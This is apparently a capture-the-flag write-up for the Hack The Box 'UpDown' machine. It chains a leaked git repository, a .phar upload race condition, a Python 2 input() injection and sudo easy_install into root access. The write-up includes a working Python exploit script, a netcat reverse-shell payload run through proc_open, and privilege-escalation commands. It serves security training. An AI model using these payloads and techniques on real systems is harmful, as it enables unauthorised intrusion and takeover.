# Key Takeaways
- For stronger security, whitelists should be used. This box showcased how single edge case functionality can lead to RCE (.phar, phar://, and proc_open). (user.txt)
- Enumeration is key! Not just when initially looking for vulnerabilities, but also when determining the most effective way to use a vulnerability. Here, it is important to determine what PHP functions are available to use that might allow execution on the system. (user.txt)

# Overview
- Platform: Linux
- HTB Rating: Medium - Hard

### Vulnerabilities
- Blacklisting is used for file extensions and URI schemes in the beta _siteisup_ upload functionality (checker.php). This should be replaced by whitelisting, as specific dangerous filetypes and URI schemes can easily be missed (.phar, phar://).

### Strengths
- The use a special header to prevent access to the `dev.siteisup.htb` is a good start, however should be reinforced by restricting access to localhost or certain IPs.
- The beta _siteisup_ does attempt to obfuscate the upload directory by md5 hashing a timestamp, making it more difficult for an attacker to access an uploaded file.

# Solving user.txt
The box was begun with some basic nmap scans, showing us that we have an open SSH port and a webserver.
```
└──╼ $sudo nmap -sS -oA allports -p- 10.10.11.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-22 21:54 EST
Nmap scan report for 10.10.11.177
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

I first visited the webserver by navigating to `http://10.10.11.177`. At inital glance at the website, there are a number of possibilities that jump out at me.

<img width="681" height="486" alt="image" src="https://github.com/user-attachments/assets/6f98e14e-40db-4fc4-bc1a-4ea8120cba0b" />

First, this website seems to function to test the availability of other websites. If our input is not properly sanitized, Server Side Request Forgery (SSRF) seems like a great thing to test here. The next thing that seems interesting is the "Debug mode" functionality— this could lend itself to retrieving feedback from an SSRF attack or command injection if the code is passing our input to unsafe system functions. The final thing that stands out is the `siteisup.htb` at the very bottom, it would be worth adding this domain to our hosts file so that we can scan for other Vhosts.

To start determining if any of these potential vulnerabilities exist, I began by running ffuf in the background to look for Vhosts. This quickly found the `dev.siteisup.htb` vhost.
```
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://siteisup.htb/ -H 'Host: FUZZ.siteisup.htb' -fs 1131

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.siteisup.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1131
________________________________________________

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3068ms]
```

I also put debug mode on and tried to test `http://localhost` to determine if SSRF might play a role here. This was successful.
<img width="662" height="574" alt="image" src="https://github.com/user-attachments/assets/9cd71856-0bff-4e9d-94d0-71525be3fee7" />

While testing other potential vectors, I began using a python script to enumerate for services that might be available on localhost, this however did not find anything.

Since we found that there is an available `dev.siteisup.htb` Vhost, I tried navigating there but found that we do not have access.
<img width="536" height="222" alt="image" src="https://github.com/user-attachments/assets/23242a4d-4fe6-4bcb-bf46-e139909f3cfa" />

Before diving down any rabbit holes, I decided to finish enumerating the initial webserver, which means looking for files and directories. Using fuff again, I quickly found that there is a `/dev` directory, with a `.git` folder inside, something that often can provide a lot of information.
```
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://siteisup.htb/FUZZ -ic -e .php,.conf,.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .php .conf .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 35ms]
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 46ms]
```

```
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://siteisup.htb/dev/FUZZ -ic -e .php,.conf,.txt -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .php .conf .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
.git                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 44ms]
```

I used git-dumper to clone the repository to my side and begin looking for sensitive/useful information.
```
└──╼ $git-dumper http://siteisup.htb/dev/.git ./gitdump
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
```

After looking through the repository, it is clear that this seems to be the source code and configuration files for a beta version of _siteisup_. There is a `.htaccess` file which specifies an interesting header that is necessary to navigate to the webpages on this webserver.
```
└──╼ $cat .htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Considering that we already found a `dev.siteisup.htb` vhost which was forbidden, it seemed likely that we may now be able to access the page if we just include this new header. While routing my traffic through Burp Suite, I used a Match and Replace rule within the Proxy settings to always add the Special-Dev header to each request.
<img width="885" height="245" alt="image" src="https://github.com/user-attachments/assets/98601f13-6fec-4cb2-b879-30a99ead48b6" />

I then navigated to `http://dev.siteisup.htb` and was greeted by a beta version of the _siteisup_ webpage, however this one seems to take an **uploaded** file as the input to check websites in mass.

As we have the source code for this new app from the .git repository, I began by reading through the code for each page and looking for places that could be vulnerable.

I started with `index.php`.
```
└──╼ $cat index.php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

Right away, it looks like there could possibly be some creative LFI vectors as the page is using the PHP _include_ function alongside unsanitized user input. That said, it is preventing common inputs for LFI such as `/etc` and `/home`. I kept this in the back of my mind but moved onto the next page.

Next, I analyzed the code that goes into the actual processing and uploading of the file, `checker.php`. This page looks extremely interesting, as it has some clear spots that may be able to be exploited. I broke down each part of the code to help me visualize how I might accomplish this.
1. Upon making a POST request using the "check" parameter to `checker.php`, the logic starts by checking to make sure the file is less than 10 kb.
```php
if($_POST['check']){
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
```
2. Next, the `$file` variable is created from the filename included in the POST parameter. This filename then has its extension checked to see if it matches a blacklist. **The use of a blacklist is extremely important here. It can be noted that the .phar filetype is NOT blacklisted.**
```php
$file = $_FILES['file']['name'];

# Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
        die("Extension not allowed!");
}
```

3. Next, a directory is created in the `/uploads/` directory. The name of the new directory is an md5 hash of the current timestamp.
```php
# Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
mkdir($dir, 0770, true);
```

4. The file is then uploaded using the `move_uploaded_file` PHP function— concatenating the prior directory variable with the prior filename variable.
```php
# Upload the file.
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

5. The file is then read, splitting each entry by newline and running the resulting data through the `isitup` function (which checks for a 200 response code using cURL). Furthermore, before running it through the checker function, it validates specifically that the data:// and ftp:// wrappers are not used within the provided URI.
```php
# Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));

foreach($websites as $site){
        $site=trim($site);
        if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                $check=isitup($site);
                if($check){
                        echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                }else{
                        echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                }
        }else{
                echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
        }
}
```

6. Finally, it then deletes the file.
```php
# Delete the uploaded file.
@unlink($final_path);
```

Based on my analysis of the code above, I devised the following attack chain which takes advantage of the race condition created due to the time it takes the server to process the uploaded data and then delete the uploaded file.
1. Upload a .phar file containing some actual websites to check alongside PHP code to execute (example below is reading `/etc/passwd`). I used my own host's webserver as the website just to make sure the requests were working.
```
http://10.10.14.14/index.php
http://10.10.14.14/index.php
http://10.10.14.14/index.php
http://10.10.14.14/index.php
http://10.10.14.14/index.php
<?php echo file_get_contents('/etc/passwd') ?>
```
2. Get the current timestamp and hash it via md5 to get the directory name used by the server
```python
timestamp = int(time.time())
mdhash = hashlib.md5(str(timestamp).encode()).hexdigest()
```
3. While `checker.php` is busy requesting the initial _actual_ websites, make your own separate web request to `http://dev.siteisup.htb/uploads/<md5hashed_timestamp>/<filename>`
_Due to the speed in which these things happen, I wrote a Python script that takes advantage of threading to make the web requests at nearly the same time. It is also worth noting that depending on the desync in time between your attacking system and the vulnerable server, the timestamp may need to be offset by 1 or more second(s)._

Below is the Python script that I wrote to see if the server would execute my uploaded .phar file.
```python
import requests
import time
import hashlib
import threading

myip = '10.10.14.1'
php = "<?php echo file_get_contents('/etc/passwd') ?>"
#php = "<?php echo ini_get('disable_functions') ?>"
#php = "<?php echo file_exists('/usr/bin/nc') ?>"
#php = f"<?php $cwd='/home/developer'; $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('file', '/tmp/error-output.txt', 'a') ); $process = proc_open('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {myip} 4445 >/tmp/f', $descriptorspec, $pipes, $cwd); echo stream_get_contents($pipes[1]); fclose($pipes[1]); ?>"

def request_one():
	burp0_url = "http://dev.siteisup.htb:80/index.php"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary112b2741cbd252be16412717ac9fcc91", "Origin": "http://dev.siteisup.htb", "Connection": "keep-alive", "Referer": "http://dev.siteisup.htb/index.php", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i", "Special-Dev": "only4dev"}
	burp0_data = f"------geckoformboundary112b2741cbd252be16412717ac9fcc91\r\nContent-Disposition: form-data; name=\"file\"; filename=\"index.phar\"\r\nContent-Type: application/octet-stream\r\n\r\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\nhttp://{myip}/index.php\n{php}\n\r\n------geckoformboundary112b2741cbd252be16412717ac9fcc91\r\nContent-Disposition: form-data; name=\"check\"\r\n\r\nCheck\r\n------geckoformboundary112b2741cbd252be16412717ac9fcc91--\r\n"
	requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

def request_two():
	burp0_url = f"http://dev.siteisup.htb:80/uploads/{mdhash}/index.phar"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i", "Special-Dev": "only4dev"}
	r = requests.get(burp0_url, headers=burp0_headers)
	print(r.text)

timestamp = int(time.time()) #+ 3
t1 = threading.Thread(target=request_one)
t1.start()
time.sleep(0.1)
mdhash = hashlib.md5(str(timestamp).encode()).hexdigest()
t2 = threading.Thread(target=request_two)
t2.start()
```

I started by using the first (uncommented) PHP payload in the script. If the server executes the PHP code, then we running the script should return us the contents of `/etc/passwd`.
```
php = "<?php echo file_get_contents('/etc/passwd') ?>"
```

Sure enough, it executes.

```
└──╼ $python3 malreq.py
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
developer:x:1002:1002::/home/developer:/bin/bash
```

Now that I knew I could execute code, I started trying to get a reverse shell via PHP functions such as `exec()` and `shell_exec()`, however I wasn't getting anywhere. Confused about the lack of responses, I decide to check on what functions were disallowed by using the following PHP payload.
```
php = "<?php echo ini_get('disable_functions') ?>"
```

We get the following response, indicating that a significant portion of the easy system execution commands were disabled.
```
└──╼ $python3 malreq.py
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php)
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

After doing a bit of research on what PHP functions allow execution on the underlying system, I found that proc_open should do the trick and does not seem to be blacklisted. That said, proc_open is not the easiest command to use, especially when we are unable to pair it with fsockopen for easier execution of the reverse shell. Due to a lack of fsockopen, I figured it would be worthwhile to determine if we have access to an executable that we might be able to use to make the network connection, something like netcat. I used the following PHP payload to check.
```
php = "<?php echo file_exists('/usr/bin/nc') ?>"
```

We get the following response, the "1" indicating that the path DOES exist.
```
└──╼ $python3 malreq.py
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
http://10.10.14.1/index.php
1
```

Knowing that we have access to this executable, I then wrote a new PHP payload that would leverage proc_open and nc to create the reverse connection back to my machine (on port 4445).
```
php = f"<?php $cwd='/home/developer'; $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('file', '/tmp/error-output.txt', 'a') ); $process = proc_open('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {myip} 4445 >/tmp/f', $descriptorspec, $pipes, $cwd); echo stream_get_contents($pipes[1]); fclose($pipes[1]); ?>"
```

This resulted in catching a shell on the machine as `www-data`.
```
└──╼ $nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.1] from (UNKNOWN) [10.10.11.177] 50134
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

##### VPN / Shell Issues
This part can safely be skipped by the majority of people.
I happened to be traveling while doing this box, and due to _something_ that was different about the laptop I was using, I had major issues with the shell that I was catching from proc_open (which I Would later realize would also happen with SSH). I was unable to initiate any operations on the remote machine that would result in more than 1000 bytes being displayed to the screen, as it would permanently freeze the connection. This made things relatively impossible, however I found that the solution was to add the following line to the HTB opevpn file.
```
mssfix 1410
```

##### Escalating Permissions
After landing in the `/home/developer/` directory, I noticed that there was a `user.txt` file, however we did not yet have permission to view it.
```
$ ls
dev
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

Then, moving into the `/home/developer/dev/` directory, there is a .py script and an ELF file with SUID permissions... this would seem like a great way to escalate to the `developer` user.
```
$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
$ file siteisup_test.py
siteisup_test.py: ASCII text
```

I then ran `strings` on the siteisup binary and found that interestingly, it seems to be calling that python script that is in the same directory.
```
strings siteisup
<SNIP>
/usr/bin/python /home/developer/dev/siteisup_test.py
<SNIP>
```

From the prior strings output, I also noted that it seemed to be calling just `python` and not `python3`, I checked the version.
```
/usr/bin/python -v
<SNIP>
Python 2.7.18 (default, Mar  8 2021, 13:02:45)
```

Calling python 2.7.18 here could certainly be interesting. I then took a peek at what the script was actually doing. It appears be taking direct user input and putting it into the python requests.get() function.
```python
$ cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

As it turns out, the requests library in Python2 does not do the same checking that is done in Python3, and so it can be injected into to run arbitary Python. Knowing this, I crafted a basic payload that would import the os library and then execute a shell.
```
$ ./siteisup
__import__('os').system('/bin/bash')
whoami
developer
```

As this exploit rasied my uid to 1002(developer) but left my gid as 33(www-data), I still couldn't read user.txt (as it was owned by root). To get around this, I simply read the id_rsa file in `/home/developer/.ssh/` and then used SSH to connect back to the server on a stable shell and read `user.txt`.
```
└──╼ $ssh -i dev_id_rsa developer@10.10.11.177
developer@updown:~$ cat user.txt
821fdd4a950f1c09894302d6d6a5cb97
```

# Solving root.txt
One of the first things I do once I have user permissions is check what sudo privileges we have. In this case, it shows that we have root access to the `easy_install` binary.
```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

Checking [GTFObins](https://gtfobins.github.io/), it can easily be found that `easy_install` is exploitable for privilege escalation.
```
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.ThHqdha4mt
Writing /tmp/tmp.ThHqdha4mt/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.ThHqdha4mt/egg-dist-tmp-TS9tsy
# whoami
root
# cd /root && cat root.txt
49de4f1d0c98773ad67100ab2cc65634
```
